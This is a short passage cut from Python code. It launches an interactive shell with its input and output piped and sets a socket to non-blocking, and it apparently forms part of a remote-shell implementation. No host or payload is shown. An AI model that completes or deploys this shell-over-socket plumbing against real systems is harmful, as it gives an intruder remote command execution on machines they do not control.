            [shell_path, "-i"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=0
        )

        sock.setblocking(False)

        max_iterations = 100
        iteration = 0

